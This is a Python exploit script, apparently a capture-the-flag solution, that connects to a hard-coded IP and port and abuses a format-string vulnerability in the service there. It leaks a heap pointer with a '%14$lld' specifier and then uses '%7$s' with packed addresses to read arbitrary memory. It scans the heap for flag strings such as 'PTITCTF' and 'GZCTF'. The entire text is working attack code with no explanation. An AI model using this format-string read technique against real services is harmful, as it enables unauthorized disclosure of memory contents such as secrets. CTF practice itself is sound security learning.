#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
heap = leak_lld(s,14)
base = heap & ~0xfff
print("heap ptr arg14=",hex(heap), "base=",hex(base))
# scan heap from base for flag
found=[]
cur=base
for i in range(4000):
    r=readmem(s,cur)
    if b'PTITCTF' in r or b'{' in r or b'flag' in r.lower() or b'GZCTF' in r:
        print("MARK", hex(cur), repr(r[:300]))
        found.append((cur,r))
    strb = r.split(b'AAAA')[0] if b'AAAA' in r else r
    adv = max(len(strb),1)
    cur += adv
    if i%500==0:
        print("  ...", hex(cur))
    if cur-base > 0x30000:
        break
print("done, found:",len(found))
s.close()
